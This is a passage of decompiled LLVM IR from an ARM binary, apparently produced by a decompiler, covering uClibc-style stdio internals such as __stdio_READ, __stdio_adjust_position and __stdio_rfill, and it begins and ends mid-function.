dec_label_pc_15f80:                               ; preds = %dec_label_pc_15f70, %dec_label_pc_15f64
  %v0_15f80 = load i32, i32* @r6, align 4
  %v7_15f80 = icmp eq i32 %v0_15f80, 1
  br i1 %v7_15f80, label %dec_label_pc_15f88, label %dec_label_pc_15f80.dec_label_pc_15f9c_crit_edge

dec_label_pc_15f80.dec_label_pc_15f9c_crit_edge:  ; preds = %dec_label_pc_15f80
  br label %dec_label_pc_15f9c

dec_label_pc_15f88:                               ; preds = %dec_label_pc_15f80
  %v0_15f88 = load i32, i32* @r5, align 4
  store i32 %v0_15f88, i32* %r0.global-to-local, align 4
  %v2_15f8c = ptrtoint i32* %stack_var_-28 to i32
  %v2_15f90 = inttoptr i32 %v0_15f88 to i8*
  %v3_15f90 = call i32 @__stdio_adjust_position(i8* %v2_15f90, i32 %v2_15f8c)
  store i32 %v3_15f90, i32* %r0.global-to-local, align 4
  %v1_15f94 = icmp slt i32 %v3_15f90, 0
  br i1 %v1_15f94, label %dec_label_pc_15ff0, label %dec_label_pc_15f88.dec_label_pc_15f9c_crit_edge

dec_label_pc_15f88.dec_label_pc_15f9c_crit_edge:  ; preds = %dec_label_pc_15f88
  %v0_15f9c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_15f9c

dec_label_pc_15f9c:                               ; preds = %dec_label_pc_15f80.dec_label_pc_15f9c_crit_edge, %dec_label_pc_15f88.dec_label_pc_15f9c_crit_edge
  %v0_15f9c = phi i32 [ %v0_15f80, %dec_label_pc_15f80.dec_label_pc_15f9c_crit_edge ], [ %v0_15f9c.pre, %dec_label_pc_15f88.dec_label_pc_15f9c_crit_edge ]
  store i32 %v0_15f9c, i32* %r2.global-to-local, align 4
  %v0_15fa0 = load i32, i32* @r5, align 4
  store i32 %v0_15fa0, i32* %r0.global-to-local, align 4
  %v4_15fa8 = call i32 @__stdio_seek(i32 %v0_15fa0, i32* nonnull %stack_var_-28, i32 %v0_15f9c)
  store i32 %v4_15fa8, i32* %r0.global-to-local, align 4
  %v1_15fac = icmp slt i32 %v4_15fa8, 0
  br i1 %v1_15fac, label %dec_label_pc_15ff0, label %dec_label_pc_15fb4

dec_label_pc_15fb4:                               ; preds = %dec_label_pc_15f9c
  %v0_15fb4 = load i32, i32* @r5, align 4
  %v1_15fb4 = inttoptr i32 %v0_15fb4 to i32*
  %v2_15fb4 = load i32, i32* %v1_15fb4, align 4
  store i32 %v2_15fb4, i32* %r3.global-to-local, align 4
  %v1_15fb8 = add i32 %v0_15fb4, 8
  %v2_15fb8 = inttoptr i32 %v1_15fb8 to i32*
  %v3_15fb8 = load i32, i32* %v2_15fb8, align 4
  store i32 %v3_15fb8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_15fc0 = and i32 %v2_15fb4, -72
  store i32 %v1_15fc0, i32* %r3.global-to-local, align 4
  %v3_15fc4 = sdiv i32 %v2_15fb4, 256
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_15fcc = trunc i32 %v3_15fc4 to i8
  %v3_15fcc = add i32 %v0_15fb4, 1
  %v4_15fcc = inttoptr i32 %v3_15fcc to i8*
  store i8 %v1_15fcc, i8* %v4_15fcc, align 1
  %v0_15fd0 = load i32, i32* %r2.global-to-local, align 4
  %v1_15fd0 = load i32, i32* @r5, align 4
  %v2_15fd0 = add i32 %v1_15fd0, 28
  %v3_15fd0 = inttoptr i32 %v2_15fd0 to i32*
  store i32 %v0_15fd0, i32* %v3_15fd0, align 4
  %v0_15fd4 = load i32, i32* %r0.global-to-local, align 4
  %v1_15fd4 = trunc i32 %v0_15fd4 to i8
  %v2_15fd4 = load i32, i32* @r5, align 4
  %v3_15fd4 = add i32 %v2_15fd4, 2
  %v4_15fd4 = inttoptr i32 %v3_15fd4 to i8*
  store i8 %v1_15fd4, i8* %v4_15fd4, align 1
  %v0_15fd8 = load i32, i32* %r3.global-to-local, align 4
  %v1_15fd8 = trunc i32 %v0_15fd8 to i8
  %v2_15fd8 = load i32, i32* @r5, align 4
  %v3_15fd8 = inttoptr i32 %v2_15fd8 to i8*
  store i8 %v1_15fd8, i8* %v3_15fd8, align 1
  %v0_15fdc = load i32, i32* %r2.global-to-local, align 4
  %v1_15fdc = load i32, i32* @r5, align 4
  %v2_15fdc = add i32 %v1_15fdc, 16
  %v3_15fdc = inttoptr i32 %v2_15fdc to i32*
  store i32 %v0_15fdc, i32* %v3_15fdc, align 4
  %v0_15fe0 = load i32, i32* %r2.global-to-local, align 4
  %v1_15fe0 = load i32, i32* @r5, align 4
  %v2_15fe0 = add i32 %v1_15fe0, 20
  %v3_15fe0 = inttoptr i32 %v2_15fe0 to i32*
  store i32 %v0_15fe0, i32* %v3_15fe0, align 4
  %v0_15fe4 = load i32, i32* %r2.global-to-local, align 4
  %v1_15fe4 = load i32, i32* @r5, align 4
  %v2_15fe4 = add i32 %v1_15fe4, 24
  %v3_15fe4 = inttoptr i32 %v2_15fe4 to i32*
  store i32 %v0_15fe4, i32* %v3_15fe4, align 4
  %v0_15fe8 = load i32, i32* %r0.global-to-local, align 4
  %v1_15fe8 = load i32, i32* @r5, align 4
  %v2_15fe8 = add i32 %v1_15fe8, 44
  %v3_15fe8 = inttoptr i32 %v2_15fe8 to i32*
  store i32 %v0_15fe8, i32* %v3_15fe8, align 4
  br label %dec_label_pc_15ff4

dec_label_pc_15ff0:                               ; preds = %dec_label_pc_15f70, %dec_label_pc_15f9c, %dec_label_pc_15f88
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15ff4

dec_label_pc_15ff4:                               ; preds = %dec_label_pc_15fb4, %dec_label_pc_15ff0
  %v0_15ff4 = load i32, i32* %r7.global-to-local, align 4
  %v2_15ff4 = icmp eq i32 %v0_15ff4, 0
  br i1 %v2_15ff4, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_15ff4
  store i32 %v2_15f00, i32* %r0.global-to-local, align 4
  store i32 79740, i32* %r3.global-to-local, align 4
  store i32 90124, i32* @lr, align 4
  call void @__pseudo_branch(i32 79740)
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_15ff4, %dec_label_pc_15f10, %bb
  %v0_1600c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1600c, i32* %r0.global-to-local, align 4
  store i32 %v3_15ef8, i32* @r4, align 4
  store i32 %v6_15ef8, i32* @r5, align 4
  store i32 %v9_15ef8, i32* @r6, align 4
  ret i32 %v0_1600c

; uselistorder directives
  uselistorder i32 %v0_15f9c, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 9, 8, 11, 0, 10, 12 }
  uselistorder i32 ()* @__pthread_return_0, { 36, 27, 26, 25, 24, 23, 22, 21, 4, 35, 45, 44, 19, 3, 2, 1, 42, 41, 40, 39, 14, 0, 13, 12, 11, 10, 9, 8, 7, 6, 5, 20, 18, 17, 16, 31, 30, 38, 15, 37, 43, 29, 28, 34, 33, 32 }
  uselistorder i32 ptrtoint (i8* @global_var_13774.590 to i32), { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @__pthread_return_void, { 42, 39, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 1, 0, 41, 40, 48, 47, 46, 45, 10, 9, 12, 11, 7, 6, 5, 4, 3, 32, 31, 30, 8, 44, 2, 43, 29, 28, 27, 26, 38, 37, 36, 35, 34, 33 }
  uselistorder i32 79740, { 0, 5, 6, 7, 8, 1, 9, 10, 11, 2, 3, 4, 12 }
  uselistorder i32 52, { 3, 1, 5, 2, 0, 6, 4 }
  uselistorder i32 22, { 3, 12, 4, 11, 5, 6, 7, 16, 13, 8, 14, 0, 15, 9, 10, 1, 2 }
  uselistorder label %.thread3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15ff4, { 1, 0 }
  uselistorder label %dec_label_pc_15ff0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_15f9c, { 1, 0 }
  uselistorder label %dec_label_pc_15f64, { 1, 0 }
}

define i32 @__stdio_READ(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r2, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_16028 = load i32, i32* @r4, align 4
  store i32 %v3_16028, i32* %stack_var_-12, align 4
  %v3_1602c = load i8, i8* %arg1, align 1
  %v4_1602c = zext i8 %v3_1602c to i32
  store i32 %v4_1602c, i32* %r3.global-to-local, align 4
  %v1_16030 = and i32 %v4_1602c, 4
  store i32 %v1_16030, i32* %r5.global-to-local, align 4
  %v2_16030 = icmp eq i32 %v1_16030, 0
  store i1 %v2_16030, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r4, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v2_16030, label %bb8, label %bb

bb:                                               ; preds = %entry
  store i32 %v3_16028, i32* @r4, align 4
  ret i32 0

bb8:                                              ; preds = %entry
  %v1_16040 = icmp slt i32 %arg2, 0
  %v2_16040 = icmp eq i32 %arg2, 0
  store i1 %v2_16040, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_16040, label %bb9, label %bb10

bb9:                                              ; preds = %bb8
  store i32 2147483647, i32* @r2, align 4
  br label %bb10

bb10:                                             ; preds = %bb8, %bb9
  %v1_16048 = add i32 %tmp, 4
  %v2_16048 = inttoptr i32 %v1_16048 to i32*
  %v3_16048 = load i32, i32* %v2_16048, align 4
  store i32 %v3_16048, i32* %r0.global-to-local, align 4
  %v1_1604c = call i32 @__libc_read(i32 %v3_16048)
  store i32 %v1_1604c, i32* %r0.global-to-local, align 4
  %v2_16050 = icmp eq i32 %v1_1604c, 0
  store i1 %v2_16050, i1* %cpsr_z.global-to-local, align 1
  %tmp11 = icmp slt i32 %v1_1604c, 1
  br i1 %tmp11, label %bb13, label %bb12

bb12:                                             ; preds = %bb10
  %v7_16054 = load i32, i32* %stack_var_-12, align 4
  store i32 %v7_16054, i32* @r4, align 4
  ret i32 %v1_1604c

bb13:                                             ; preds = %bb10
  %v0_16058 = load i32, i32* @r4, align 4
  %v1_16058 = inttoptr i32 %v0_16058 to i32*
  %v2_16058 = load i32, i32* %v1_16058, align 4
  %v1_1605c = or i32 %v2_16058, 8
  store i32 %v1_1605c, i32* %r1.global-to-local, align 4
  %v1_16060 = or i32 %v2_16058, 4
  store i32 %v1_16060, i32* %r3.global-to-local, align 4
  %v3_16064 = sdiv i32 %v2_16058, 256
  store i32 %v3_16064, i32* @ip, align 4
  br i1 %v2_16050, label %.thread, label %bb14

bb14:                                             ; preds = %bb13
  %v1_1606c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_1606c, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread:                                          ; preds = %bb13
  %v2_16070 = trunc i32 %v3_16064 to i8
  %v4_16070 = add i32 %v0_16058, 1
  %v5_16070 = inttoptr i32 %v4_16070 to i8*
  store i8 %v2_16070, i8* %v5_16070, align 1
  %v0_16074.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_16074.pr, label %.thread1, label %.thread2

.thread1:                                         ; preds = %.thread
  %v1_16074 = load i32, i32* %r3.global-to-local, align 4
  %v2_16074 = trunc i32 %v1_16074 to i8
  %v3_16074 = load i32, i32* @r4, align 4
  %v4_16074 = inttoptr i32 %v3_16074 to i8*
  store i8 %v2_16074, i8* %v4_16074, align 1
  %v0_16078.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_16078.pr.pr, label %.thread3, label %.thread2

.thread2:                                         ; preds = %bb14, %.thread, %.thread1
  %v1_16078 = load i32, i32* @ip, align 4
  %v2_16078 = trunc i32 %v1_16078 to i8
  %v3_16078 = load i32, i32* @r4, align 4
  %v4_16078 = add i32 %v3_16078, 1
  %v5_16078 = inttoptr i32 %v4_16078 to i8*
  store i8 %v2_16078, i8* %v5_16078, align 1
  %v0_1607c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1607c.pr, label %.thread3, label %bb15

bb15:                                             ; preds = %.thread2
  %v1_1607c = load i32, i32* %r1.global-to-local, align 4
  %v2_1607c = trunc i32 %v1_1607c to i8
  %v3_1607c = load i32, i32* @r4, align 4
  %v4_1607c = inttoptr i32 %v3_1607c to i8*
  store i8 %v2_1607c, i8* %v4_1607c, align 1
  br label %.thread3

.thread3:                                         ; preds = %.thread1, %.thread2, %bb15
  %v2_16080 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_16080, i32* @r4, align 4
  %v11_16080 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v11_16080

; uselistorder directives
  uselistorder i32 %v3_16064, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 1, 5, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 (i32)* @__libc_read, { 1, 2, 0 }
  uselistorder i32 2147483647, { 2, 3, 0, 1 }
  uselistorder label %.thread3, { 2, 1, 0 }
  uselistorder label %.thread2, { 2, 1, 0 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @__stdio_adjust_position(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_16084 = load i32, i32* @r4, align 4
  store i32 %v3_16084, i32* %stack_var_-16, align 4
  %v2_16088 = add i32 %tmp, 1
  %v3_16088 = inttoptr i32 %v2_16088 to i8*
  %v4_16088 = load i8, i8* %v3_16088, align 1
  %v5_16088 = zext i8 %v4_16088 to i32
  %v3_1608c = load i8, i8* %arg1, align 1
  %v4_1608c = zext i8 %v3_1608c to i32
  store i32 %v4_1608c, i32* %r2.global-to-local, align 4
  %v4_16090 = mul nuw nsw i32 %v5_16088, 256
  %v5_16090 = or i32 %v4_1608c, %v4_16090
  store i32 %v5_16090, i32* @lr, align 4
  %tmp15 = urem i8 %v3_1608c, 4
  %v2_16094 = icmp eq i8 %tmp15, 0
  store i32 %arg2, i32* %r6.global-to-local, align 4
  br i1 %v2_16094, label %bb, label %dec_label_pc_160a4

bb:                                               ; preds = %entry
  store i32 0, i32* @ip, align 4
  br label %.thread

dec_label_pc_160a4:                               ; preds = %entry
  %v1_16094 = zext i8 %tmp15 to i32
  %v1_160a4 = add nsw i32 %v1_16094, -1
  store i32 %v1_160a4, i32* @ip, align 4
  %v7_160a4 = icmp eq i8 %tmp15, 1
  br i1 %v7_160a4, label %.thread, label %dec_label_pc_160ac

dec_label_pc_160ac:                               ; preds = %dec_label_pc_160a4
  %v1_160ac = and i32 %v4_16090, 2048
  %v2_160ac = icmp eq i32 %v1_160ac, 0
  br i1 %v2_160ac, label %.thread, label %dec_label_pc_160b4

dec_label_pc_160b4:                               ; preds = %dec_label_pc_160ac
  %v8_160b8 = icmp sgt i32 %v1_160a4, 1
  br i1 %v8_160b8, label %dec_label_pc_16144, label %dec_label_pc_160bc

dec_label_pc_160bc:                               ; preds = %dec_label_pc_160b4
  %v2_160bc = add i32 %tmp, 40
  %v3_160bc = inttoptr i32 %v2_160bc to i32*
  %v4_160bc = load i32, i32* %v3_160bc, align 4
  %v2_160c0 = icmp eq i32 %v4_160bc, 0
  br i1 %v2_160c0, label %dec_label_pc_160c8, label %dec_label_pc_16144

dec_label_pc_160c8:                               ; preds = %dec_label_pc_160bc
  %v2_160c8 = add i32 %tmp, 3
  %v3_160c8 = inttoptr i32 %v2_160c8 to i8*
  %v4_160c8 = load i8, i8* %v3_160c8, align 1
  %v5_160c8 = zext i8 %v4_160c8 to i32
  %v2_160cc = add i32 %tmp, 44
  %v3_160cc = inttoptr i32 %v2_160cc to i32*
  %v4_160cc = load i32, i32* %v3_160cc, align 4
  store i32 %v4_160cc, i32* %r2.global-to-local, align 4
  %v2_160d0 = sub nsw i32 %v1_160a4, %v5_160c8
  %v1_160d8 = add nsw i32 %v2_160d0, -1
  store i32 %v1_160d8, i32* @ip, align 4
  %tmp11 = icmp slt i32 %v4_160cc, 1
  br i1 %tmp11, label %.thread, label %bb12

bb12:                                             ; preds = %dec_label_pc_160c8
  %v7_160dc = add i32 %tmp, 2
  %v8_160dc = inttoptr i32 %v7_160dc to i8*
  %v9_160dc = load i8, i8* %v8_160dc, align 1
  %v10_160dc = zext i8 %v9_160dc to i32
  %v7_160e0 = sub nsw i32 %v1_160d8, %v10_160dc
  store i32 %v7_160e0, i32* @ip, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_160c8, %bb, %dec_label_pc_160ac, %dec_label_pc_160a4, %bb12
  %v0_160fc = phi i32 [ %v1_160a4, %dec_label_pc_160ac ], [ %v1_160a4, %dec_label_pc_160a4 ], [ 0, %bb ], [ %v7_160e0, %bb12 ], [ %v1_160d8, %dec_label_pc_160c8 ]
  %v1_160e4 = and i32 %v4_1608c, 64
  %v2_160e4 = icmp eq i32 %v1_160e4, 0
  %storemerge.in.in.v = select i1 %v2_160e4, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_160f0 = add i32 %tmp, 16
  %v3_160f0 = inttoptr i32 %v2_160f0 to i32*
  %v4_160f0 = load i32, i32* %v3_160f0, align 4
  %v2_160f4 = sub i32 %storemerge, %v4_160f0
  %v1_160f8 = inttoptr i32 %arg2 to i32*
  %v2_160f8 = load i32, i32* %v1_160f8, align 4
  store i32 %v2_160f8, i32* %r1.global-to-local, align 4
  %v3_160f8 = add i32 %arg2, 4
  %v4_160f8 = inttoptr i32 %v3_160f8 to i32*
  %v5_160f8 = load i32, i32* %v4_160f8, align 4
  store i32 %v5_160f8, i32* %r2.global-to-local, align 4
  %v2_160fc = add i32 %v2_160f4, %v0_160fc
  store i32 %v2_160fc, i32* %r5.global-to-local, align 4
  %v2_16100 = sub i32 %v2_160f8, %v2_160fc
  %v2_16104 = and i32 %v2_160fc, 1073741824
  %v3_16104 = icmp ne i32 %v2_16104, 0
  %v6_16104 = icmp eq i1 %v3_16104, false
  %tmp16 = icmp slt i32 %v2_160fc, 0
  %v4_16104.neg = zext i1 %tmp16 to i32
  %v7_16104 = add i32 %v5_160f8, %v4_16104.neg
  %v9_16104 = sext i1 %v6_16104 to i32
  %v10_16104 = add i32 %v7_16104, %v9_16104
  store i32 %v10_16104, i32* %r4.global-to-local, align 4
  store i32 %v2_16100, i32* %v1_160f8, align 4
  %v5_16108 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_16108, i32* %v4_160f8, align 4
  %v0_1610c = load i32, i32* %r6.global-to-local, align 4
  %v1_1610c = add i32 %v0_1610c, 4
  %v2_1610c = inttoptr i32 %v1_1610c to i32*
  %v3_1610c = load i32, i32* %v2_1610c, align 4
  %v1_16110 = load i32, i32* %r2.global-to-local, align 4
  %v8_16114 = icmp sgt i32 %v3_1610c, %v1_16110
  br i1 %v8_16114, label %dec_label_pc_16128, label %dec_label_pc_16118

dec_label_pc_16118:                               ; preds = %.thread
  %v9_16110 = icmp eq i32 %v3_1610c, %v1_16110
  br i1 %v9_16110, label %dec_label_pc_1611c, label %dec_label_pc_1612cthread-pre-split

dec_label_pc_1611c:                               ; preds = %dec_label_pc_16118
  %v1_1611c = inttoptr i32 %v0_1610c to i32*
  %v2_1611c = load i32, i32* %v1_1611c, align 4
  %v1_16120 = load i32, i32* %r1.global-to-local, align 4
  %tmp17 = icmp ugt i32 %v2_1611c, %v1_16120
  br i1 %tmp17, label %dec_label_pc_16128, label %dec_label_pc_1612cthread-pre-split

dec_label_pc_16128:                               ; preds = %dec_label_pc_1611c, %.thread
  %v0_16128 = load i32, i32* %r5.global-to-local, align 4
  %v1_16128 = sub i32 0, %v0_16128
  store i32 %v1_16128, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1612c

dec_label_pc_1612cthread-pre-split:               ; preds = %dec_label_pc_1611c, %dec_label_pc_16118
  %v0_1612c.pr = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1612c

dec_label_pc_1612c:                               ; preds = %dec_label_pc_1612cthread-pre-split, %dec_label_pc_16128
  %v0_1612c = phi i32 [ %v0_1612c.pr, %dec_label_pc_1612cthread-pre-split ], [ %v1_16128, %dec_label_pc_16128 ]
  %v1_1612c = icmp slt i32 %v0_1612c, 0
  br i1 %v1_1612c, label %dec_label_pc_16134, label %dec_label_pc_16148

dec_label_pc_16134:                               ; preds = %dec_label_pc_1612c
  %v0_16134 = call i32 @__errno_location()
  %v2_1613c = inttoptr i32 %v0_16134 to i32*
  store i32 75, i32* %v2_1613c, align 4
  %v0_16148.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16148

dec_label_pc_16144:                               ; preds = %dec_label_pc_160bc, %dec_label_pc_160b4
  store i32 -1, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16148

dec_label_pc_16148:                               ; preds = %dec_label_pc_1612c, %dec_label_pc_16134, %dec_label_pc_16144
  %v0_16148 = phi i32 [ %v0_1612c, %dec_label_pc_1612c ], [ %v0_16148.pre, %dec_label_pc_16134 ], [ -1, %dec_label_pc_16144 ]
  %v2_1614c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1614c, i32* @r4, align 4
  ret i32 %v0_16148

; uselistorder directives
  uselistorder i32 %v1_16110, { 1, 0 }
  uselistorder i32 %v3_1610c, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i8 %tmp15, { 0, 2, 1 }
  uselistorder i32 %v4_1608c, { 1, 0, 2 }
  uselistorder i32 %tmp, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32* %r5.global-to-local, { 0, 3, 4, 1, 2, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder i32 1073741824, { 2, 3, 0, 1 }
  uselistorder i32 2048, { 2, 3, 4, 5, 1, 6, 7, 0 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_16148, { 2, 1, 0 }
  uselistorder label %.thread, { 4, 0, 2, 3, 1 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_16150 = load i32, i32* @r4, align 4
  store i32 %v3_16150, i32* %stack_var_-8, align 4
  %v1_16154 = add i32 %arg1, 8
  %v1_16158 = inttoptr i32 %v1_16154 to i32*
  %v2_16158 = load i32, i32* %v1_16158, align 4
  store i32 %v2_16158, i32* @r1, align 4
  %v3_16158 = add i32 %arg1, 12
  %v4_16158 = inttoptr i32 %v3_16158 to i32*
  %v5_16158 = load i32, i32* %v4_16158, align 4
  %v2_1615c = sub i32 %v5_16158, %v2_16158
  store i32 %v2_1615c, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v3_16164 = inttoptr i32 %arg1 to i8*
  %v4_16164 = call i32 @__stdio_READ(i8* %v3_16164, i32 %v2_16158, i32 %v2_1615c)
  %v0_16168 = load i32, i32* @r4, align 4
  %v1_16168 = add i32 %v0_16168, 8
  %v2_16168 = inttoptr i32 %v1_16168 to i32*
  %v3_16168 = load i32, i32* %v2_16168, align 4
  store i32 %v3_16168, i32* %r2.global-to-local, align 4
  %v2_1616c = add i32 %v3_16168, %v4_16164
  %v2_16170 = add i32 %v0_16168, 20
  %v3_16170 = inttoptr i32 %v2_16170 to i32*
  store i32 %v2_1616c, i32* %v3_16170, align 4
  %v0_16174 = load i32, i32* %r2.global-to-local, align 4
  %v1_16174 = load i32, i32* @r4, align 4
  %v2_16174 = add i32 %v1_16174, 16
  %v3_16174 = inttoptr i32 %v2_16174 to i32*
  store i32 %v0_16174, i32* %v3_16174, align 4
  %v2_16178 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_16178, i32* @r4, align 4
  ret i32 %v4_16164

; uselistorder directives
  uselistorder i32 %v4_16164, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
}

define i32 @__stdio_trans2r_o() local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1617c = load i32, i32* @r4, align 4
  store i32 %v3_1617c, i32* %stack_var_-12, align 4
  %v0_16180 = load i32, i32* @r0, align 4
  %v1_16180 = inttoptr i32 %v0_16180 to i8*
  %v2_16180 = load i8, i8* %v1_16180, align 1
  %v3_16180 = zext i8 %v2_16180 to i32
  store i32 %v3_16180, i32* %r2.global-to-local, align 4
  %v1_16184 = add i32 %v0_16180, 1
  %v2_16184 = inttoptr i32 %v1_16184 to i8*
  %v3_16184 = load i8, i8* %v2_16184, align 1
  %v4_16184 = zext i8 %v3_16184 to i32
  store i32 %v4_16184, i32* %r3.global-to-local, align 4
  %v4_16188 = mul nuw nsw i32 %v4_16184, 256
  %v5_16188 = or i32 %v4_16188, %v3_16180
  store i32 %v5_16188, i32* %r2.global-to-local, align 4
  %v1_1618c = load i32, i32* @r1, align 4
  %v2_1618c = and i32 %v1_1618c, %v5_16188
  %v4_1618c = icmp eq i32 %v2_1618c, 0
  store i32 %v0_16180, i32* @r4, align 4
  br i1 %v4_1618c, label %dec_label_pc_16198, label %dec_label_pc_161b0

dec_label_pc_16198:                               ; preds = %entry
  %v1_16198 = and i32 %v5_16188, 2176
  %v2_16198 = icmp eq i32 %v1_16198, 0
  br i1 %v2_16198, label %dec_label_pc_161a0, label %dec_label_pc_161c4

dec_label_pc_161a0:                               ; preds = %dec_label_pc_16198
  %v2_161a0 = or i32 %v1_1618c, %v5_16188
  store i32 %v2_161a0, i32* %r2.global-to-local, align 4
  %v3_161a4 = sdiv i32 %v2_161a0, 256
  store i32 %v3_161a4, i32* %r3.global-to-local, align 4
  %v1_161a8 = trunc i32 %v3_161a4 to i8
  store i8 %v1_161a8, i8* %v2_16184, align 1
  %v0_161ac = load i32, i32* %r2.global-to-local, align 4
  %v1_161ac = trunc i32 %v0_161ac to i8
  %v2_161ac = load i32, i32* @r0, align 4
  %v3_161ac = inttoptr i32 %v2_161ac to i8*
  store i8 %v1_161ac, i8* %v3_161ac, align 1
  %v0_161b0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_161b0

dec_label_pc_161b0:                               ; preds = %entry, %dec_label_pc_161a0
  %v0_161b0 = phi i32 [ %v0_16180, %entry ], [ %v0_161b0.pre, %dec_label_pc_161a0 ]
  %v1_161b0 = inttoptr i32 %v0_161b0 to i8*
  %v2_161b0 = load i8, i8* %v1_161b0, align 1
  %v3_161b0 = zext i8 %v2_161b0 to i32
  store i32 %v3_161b0, i32* %r2.global-to-local, align 4
  %v1_161b4 = add i32 %v0_161b0, 1
  %v2_161b4 = inttoptr i32 %v1_161b4 to i8*
  %v3_161b4 = load i8, i8* %v2_161b4, align 1
  %v4_161b4 = zext i8 %v3_161b4 to i32
  %v4_161b8 = mul nuw nsw i32 %v4_161b4, 256
  %v5_161b8 = or i32 %v4_161b8, %v3_161b0
  store i32 %v5_161b8, i32* %r3.global-to-local, align 4
  %v1_161bc = and i32 %v3_161b0, 16
  store i32 %v1_161bc, i32* %r5.global-to-local, align 4
  %v2_161bc = icmp eq i32 %v1_161bc, 0
  br i1 %v2_161bc, label %dec_label_pc_161ec, label %dec_label_pc_161c4

dec_label_pc_161c4:                               ; preds = %dec_label_pc_16198, %dec_label_pc_161b0
  %v0_161c4 = call i32 @__errno_location()
  store i32 9, i32* %r3.global-to-local, align 4
  %v2_161cc = inttoptr i32 %v0_161c4 to i32*
  store i32 9, i32* %v2_161cc, align 4
  br label %dec_label_pc_161d0

dec_label_pc_161d0:                               ; preds = %dec_label_pc_161f4, %dec_label_pc_161c4
  %v0_161d0 = load i32, i32* @r4, align 4
  %v1_161d0 = inttoptr i32 %v0_161d0 to i32*
  %v2_161d0 = load i32, i32* %v1_161d0, align 4
  %v1_161d4 = or i32 %v2_161d0, 8
  store i32 %v1_161d4, i32* %r3.global-to-local, align 4
  %v3_161d8 = sdiv i32 %v2_161d0, 256
  store i32 %v3_161d8, i32* %r2.global-to-local, align 4
  %v1_161e0 = trunc i32 %v3_161d8 to i8
  %v3_161e0 = add i32 %v0_161d0, 1
  %v4_161e0 = inttoptr i32 %v3_161e0 to i8*
  store i8 %v1_161e0, i8* %v4_161e0, align 1
  %v0_161e4 = load i32, i32* %r3.global-to-local, align 4
  %v1_161e4 = trunc i32 %v0_161e4 to i8
  %v2_161e4 = load i32, i32* @r4, align 4
  %v3_161e4 = inttoptr i32 %v2_161e4 to i8*
  store i8 %v1_161e4, i8* %v3_161e4, align 1
  %v2_161e8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_161e8, i32* @r4, align 4
